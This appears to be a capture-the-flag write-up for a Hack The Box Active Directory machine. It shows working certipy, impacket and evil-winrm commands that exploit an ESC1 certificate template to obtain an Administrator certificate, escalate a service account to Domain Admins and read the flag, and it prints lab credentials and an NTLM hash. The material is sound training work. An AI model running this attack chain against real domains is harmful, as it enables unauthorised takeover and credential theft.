---

## Initial Access

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

---

## ADCS Enumeration

```bash
certipy-ad find \
  -u svc_ldap@authority.htb \
  -p 'lDaP_1n_th3_cle4r!' \
  -dc-ip 10.129.229.56 \
  -vulnerable
```

**Vulnerable template:** `CorpVPN`  
**Vulnerability:** ESC1  
**Reason:** `Enrollee Supplies Subject = True` + `Client Authentication = True`  
**Dangerous rights:** `AUTHORITY.HTB\Domain Computers`

---

## Create Fake Machine Account

```bash
impacket-addcomputer authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!' \
  -computer-name 'FAKEPC$' \
  -computer-pass 'Password123!'
```

---

## Request Administrator Certificate

```bash
certipy-ad req \
  -u 'FAKEPC$@authority.htb' \
  -p 'Password123!' \
  -ca AUTHORITY-CA \
  -template CorpVPN \
  -upn administrator@authority.htb \
  -dc-ip 10.129.229.56
```

Generated: `administrator.pfx`

---

## PKINIT Failure

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.56
# Error: KDC_ERR_PADATA_TYPE_NOSUPP
```

PKINIT unsupported — pivot to LDAP Schannel instead.

---

## LDAP Shell Authentication

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -ldap-shell \
  -dc-ip 10.129.229.56
```

Authenticated as: `HTB\Administrator`

---

## Privilege Escalation

```bash
add_user_to_group svc_ldap "Domain Admins"
get_user_groups svc_ldap
# CN=Domain Admins,CN=Users,DC=authority,DC=htb
```

---

## Root Flag

```bash
evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
type C:\Users\Administrator\Desktop\root.txt
```

**Administrator NTLM:** `08546b45a0f19d3238f1c73892ae1914`

---

## Attack Chain Summary

1. Enumerated SMB → found `Development` share
2. Found Ansible vault files → cracked credentials
3. Logged into PWM → captured LDAP creds via Responder
4. WinRM access as `svc_ldap`
5. Enumerated ADCS → found ESC1 on `CorpVPN` template
6. Created fake machine account → requested Administrator certificate
7. PKINIT failed → used LDAP Schannel auth instead
8. Added `svc_ldap` to Domain Admins → full compromise

---

## Key Takeaways

- ESC1 allows arbitrary SAN in certificate requests — direct path to Domain Admin.
- Machine accounts can abuse `Domain Computers` enrollment rights.
- When PKINIT fails, LDAP Schannel (`-ldap-shell`) is a reliable bypass.
- Ansible vault files in SMB shares are a goldmine for credential extraction.
